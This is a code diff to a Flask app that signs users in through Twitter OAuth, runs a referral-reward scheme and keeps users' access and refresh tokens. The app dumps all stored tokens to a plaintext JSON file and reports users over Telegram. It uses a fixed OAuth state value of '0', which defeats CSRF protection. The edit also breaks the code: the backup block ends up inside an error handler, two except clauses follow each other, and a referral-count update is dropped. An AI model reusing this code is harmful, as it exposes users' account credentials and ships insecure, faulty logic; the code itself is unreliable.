@@ -82,7 +82,7 @@ def store_token(access_token, refresh_token, username):
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor()
 
-        # Check if the user already exists
+        # Check if user exists
         cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
         existing_user = cursor.fetchone()
 
@@ -95,25 +95,23 @@ def store_token(access_token, refresh_token, username):
             )
             print(f"Updated tokens for existing user @{username}")
         else:
-            # Insert new user with token data
-            cursor.execute('''
+            # Create a new user entry with unique referral URL
+            cursor.execute(
+                '''
                 INSERT INTO users (username, access_token, refresh_token, referral_count, referral_reward, token_balance)
                 VALUES (%s, %s, %s, 0, 0.0, 0.0) RETURNING id
-            ''', (username, access_token, refresh_token))
-            user_id = cursor.fetchone()[0]
-
-            # Generate referral URL
-            referral_url = f"{APP_URL}/?referrer_id={user_id}"
-            cursor.execute(
-                "UPDATE users SET referral_url = %s WHERE id = %s",
-                (referral_url, user_id)
+                ''',
+                (username, access_token, refresh_token)
             )
+            user_id = cursor.fetchone()[0]
+            referral_url = f"{APP_URL}/?referrer_id={user_id}"
+            cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
             print(f"New user created with referral URL: {referral_url}")
 
-            # Check if there's a referrer and apply referral reward
+            # Apply referral reward if referrer_id is in session
             referrer_id = session.get('referrer_id')
             if referrer_id:
-                referral_reward = 10.0  # Set referral reward amount
+                referral_reward = 10.0
                 cursor.execute(
                     '''
                     UPDATE users
@@ -128,14 +126,18 @@ def store_token(access_token, refresh_token, username):
         conn.commit()
         conn.close()
 
-        # Backup all tokens
+        # Notify via Telegram
+        send_message_via_telegram(f"💾 User @{username} has been stored. Referral URL: {referral_url}")
+
+    except Exception as e:
+        print(f"Database error while storing token: {e}")
+
         backup_data = get_all_tokens()
         formatted_backup_data = [{'access_token': a, 'refresh_token': r, 'username': u} for a, r, u in backup_data]
         with open(BACKUP_FILE, 'w') as f:
             json.dump(formatted_backup_data, f, indent=4)
         print(f"Backup created/updated in {BACKUP_FILE}. Total tokens: {len(backup_data)}")
 
-        # Notify via Telegram
         send_message_via_telegram(f"💾 User @{username} stored. Referral URL: {referral_url}\n📊 Total tokens in backup: {len(backup_data)}")
 
     except Exception as e:
@@ -705,9 +707,14 @@ def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
-    referrer_id = request.args.get('referrer_id')  # Retrieve referrer_id from the URL if it exists
 
-    # If user is already logged in, send a return notification and redirect to the welcome page
+    # Capture referrer_id if available and store it in the session
+    referrer_id = request.args.get('referrer_id')
+    if referrer_id:
+        session['referrer_id'] = referrer_id
+        print(f"Referrer ID {referrer_id} stored in session.")
+
+    # Check if user is already logged in
     if 'username' in session:
         username = session['username']
         send_message_via_telegram(f"👋 @{username} just returned to the website.")
@@ -718,7 +725,6 @@ def home():
         state = "0"  # Fixed state value for initialization
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
         session['code_verifier'] = code_verifier  # Store code_verifier in the session
-        session['referrer_id'] = referrer_id  # Store referrer_id in session if available
 
         # Redirect the user to Twitter’s authorization page
         authorization_url = (
@@ -737,7 +743,6 @@ def home():
             return "Invalid state parameter", 403
 
         code_verifier = session.pop('code_verifier', None)
-        referrer_id = session.pop('referrer_id', None)
 
         # Exchange authorization code for tokens
         token_url = "https://api.twitter.com/2/oauth2/token"
@@ -761,21 +766,6 @@ def home():
             if username:
                 # Store tokens and username in the database
                 store_token(access_token, refresh_token, username)
-
-                # Update referral count if there's a referrer
-                if referrer_id:
-                    try:
-                        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-                        cursor = conn.cursor()
-                        cursor.execute(
-                            "UPDATE users SET referral_count = referral_count + 1 WHERE id = %s",
-                            (referrer_id,)
-                        )
-                        conn.commit()
-                        conn.close()
-                        print(f"Referral count updated for referrer ID {referrer_id}")
-                    except Exception as e:
-                        print(f"Error updating referral count for referrer ID {referrer_id}: {e}")
 
                 # Store username in the session
                 session['username'] = username
@@ -805,6 +795,7 @@ def home():
 
     # Render home page with Sign Up/Login button if not authorized
     return render_template('home.html')
+
 
 
 @app.route('/welcome')
